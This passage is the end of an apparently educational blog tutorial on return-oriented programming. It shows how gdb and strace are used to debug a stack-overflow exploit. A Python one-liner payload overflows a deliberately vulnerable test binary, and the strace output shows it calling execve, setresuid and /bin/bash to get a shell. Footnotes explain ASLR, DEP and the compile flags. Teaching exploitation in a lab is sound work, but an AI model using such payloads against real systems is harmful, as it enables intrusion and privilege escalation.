<span class="go">0xffffd6ec: 0x5564b6f0  0x80483fa &lt;main&gt;    0x80483fa &lt;main&gt;    0x0</span>
</pre></div>


<p>It should look like this:</p>
<div class="highlight"><pre><span class="go">(gdb) x/4a $esp</span>
<span class="go">0xffffd6ec: 0x5564b6f0 &lt;execlp&gt; 0x80483fa &lt;main&gt;    0x80483fa &lt;main&gt;    0x0</span>
</pre></div>


<h2><code>strace</code></h2>
<p>Another really useful tool is <code>strace</code>, which will print out every syscall made by the program. In the following example, I forgot to set <code>PATH</code>: the exploit worked but it was unable to find my file:</p>
<div class="highlight"><pre><span class="gp">$</span> cat &lt;<span class="o">(</span>python -c <span class="s1">&#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\xf0\xb6\x64\x55&quot; + &quot;\xfa\x83\x04\x08&quot;*2 + &quot;\x00\x00\x00\x00&quot;&#39;</span><span class="o">)</span> | strace ./a.out
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">read(0, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;..., 200) = 129</span>
<span class="go">execve(&quot;/usr/local/sbin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">execve(&quot;/usr/local/bin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">execve(&quot;/usr/sbin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">execve(&quot;/usr/bin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">execve(&quot;/sbin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">execve(&quot;/bin/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = -1 ENOENT (No such file or directory)</span>
<span class="go">...</span>
</pre></div>


<p>In this case, I forgot to keep <code>stdin</code> open, so it happily executes my <code>python</code> program and <code>bash</code> and then immediately <code>exit</code>s after a 0 byte <code>read</code>:</p>
<div class="highlight"><pre><span class="gp">$</span> python -c <span class="s1">&#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\xf0\xb6\x64\x55&quot; + &quot;\xfa\x83\x04\x08&quot;*2 + &quot;\x00\x00\x00\x00&quot;&#39;</span> | strace ./a.out
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">read(0, &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;..., 200) = 129</span>
<span class="go">execve(&quot;/tmp/U\211\345\203\344\360\350\317\377\377\377\270&quot;, [], [/* 30 vars */]) = 0</span>
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">geteuid()                               = 1337</span>
<span class="go">geteuid()                               = 1337</span>
<span class="go">geteuid()                               = 1337</span>
<span class="go">setresuid(1337, 1337, 1337)             = 0</span>
<span class="go">execve(&quot;/bin/bash&quot;, [&quot;bash&quot;], [/* 21 vars */]) = 0</span>
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">read(0, &quot;&quot;, 1)                          = 0</span>
<span class="go">exit_group(0)                           = ?</span>
</pre></div>


<div class="footnote">
<hr />
<ol>
<li id="fn:1">
<p><a href="https://en.wikipedia.org/wiki/ASLR">ASLR</a> is the technique where portions of the program, such as the stack or the heap, are placed at a random location in memory when the program is first run. This causes the address of stack buffers, allocated objects, etc to be randomized between runs of the program and prevents the attacker.&#160;<a class="footnote-backref" href="#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text">&#8617;</a></p>
</li>
<li id="fn:2">
<p><a href="https://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</a> is the technique where memory can be either writable or executable, but not both. This prevents an attacker from filling a buffer with shellcode and executing it. While this usually requires hardware support, it is quite commonly used on modern programs. &#160;<a class="footnote-backref" href="#fnref:2" rev="footnote" title="Jump back to footnote 2 in the text">&#8617;</a></p>
</li>
<li id="fn:3">
<p>To make life easier for us, we compile with <code>gcc -m32 -fno-stack-protector easy_rop.c</code>. &#160;<a class="footnote-backref" href="#fnref:3" rev="footnote" title="Jump back to footnote 3 in the text">&#8617;</a></p>
</li>
<li id="fn:4">
<p>You'll note that we use print the exploit string in a python subshell.  This is so we can print escape characters and use arbitrary bytes in our payload. We also surround the subshell in double quotes in case the payload had whitespace in it.&#160;<a class="footnote-backref" href="#fnref:4" rev="footnote" title="Jump back to footnote 4 in the text">&#8617;</a></p>
</li>
<li id="fn:7">
<p>These can be found in the <code>libc</code> library itself: <code>ldd a.out</code> tells us that the library can be found at <code>/lib/i386-linux-gnu/libc.so.6</code>. We can use <code>objdump</code>, <code>nm</code>, <code>strings</code>, etc. on this library to directly find any information we need. These addresses will all be offset from the base of <code>libc</code> in memory and can be used to compute the actual addresses by adding the offset of <code>libc</code> in memory.&#160;<a class="footnote-backref" href="#fnref:7" rev="footnote" title="Jump back to footnote 5 in the text">&#8617;</a></p>
</li>
<li id="fn:8">
<p>I believe someone even <a href="http://cseweb.ucsd.edu/~hovav/papers/rbss12.html">tried to prove</a> that ROP is turing complete.   &#160;<a class="footnote-backref" href="#fnref:8" rev="footnote" title="Jump back to footnote 6 in the text">&#8617;</a></p>
</li>
<li id="fn:10">
<p>Note the <code>$'\211'</code> syntax to enter escape characters.&#160;<a class="footnote-backref" href="#fnref:10" rev="footnote" title="Jump back to footnote 7 in the text">&#8617;</a></p>
</li>
<li id="fn:11">
<p>To see why this is necessary, compare the behavior of <code>echo ls | bash</code> to <code>cat &lt;(echo ls) - | bash</code>.&#160;<a class="footnote-backref" href="#fnref:11" rev="footnote" title="Jump back to footnote 8 in the text">&#8617;</a></p>
</li>
</ol>
</div>
        </div><!-- /.entry-content -->
        <div class="comments">
        <h2>Comments !</h2>
            <div id="disqus_thread"></div>
            <script type="text/javascript">
               var disqus_identifier = "posts/2013/05/28/introduction-to-return-oriented-programming-rop.html";
               (function() {
               var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
               dsq.src = 'http://codearcana.disqus.com/embed.js';
               (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
              })();
            </script>
        </div>

</article>
</section>

        <aside id="sidebar">
                <div class="widget">
                        <h2>Categories</h2>
                        <ul>
                           <li ><a href="http://codearcana.com/category/performance.html">performance</a></li>
                           <li class="active"><a href="http://codearcana.com/category/security.html">security</a></li>
                           <li ><a href="http://codearcana.com/category/software-engineering.html">software engineering</a></li>
                        </ul>
		</div>
		<div class="widget">
		    <h2>Tags</h2>
		    <ul class="cloud">
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/mac-osx.html">mac osx</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/bash.html">bash</a>
			</li>
			<li class="tag-2">
			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/zsh.html">zsh</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
			</li>
		    </ul>
		</div>


                <div class="widget blogroll">
                        <h2>Blogroll</h2>
                        <ul>
                            <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
                            <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
                            <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
                            <li><a href="http://highscalability.com/">High Scalability</a></li>
                            <li><a href="http://coderweekly.com/">Coder Weekly</a></li>
                            <li><a href="http://www.phrack.org/">phrack</a></li>
                            <li><a href="http://jbremer.org/">skier_'s blog</a></li>
                            <li><a href="http://dtrace.org/blogs">dtrace blog</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="widget social">
                        <h2>Social</h2>
			<ul>
                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

				<li><a href="https://twitter.com/awreece">twitter</a></li>
				<li><a href="https://github.com/awreece">github</a></li>
				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
                        </ul>
                </div><!-- /.social -->
        </aside><!-- /#sidebar -->
    <script type="text/javascript">
    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script>
    <script type="text/javascript">
    try {
        var pageTracker = _gat._getTracker("UA-40107691-1");
    pageTracker._trackPageview();
    } catch(err) {}</script>
</body>
</html>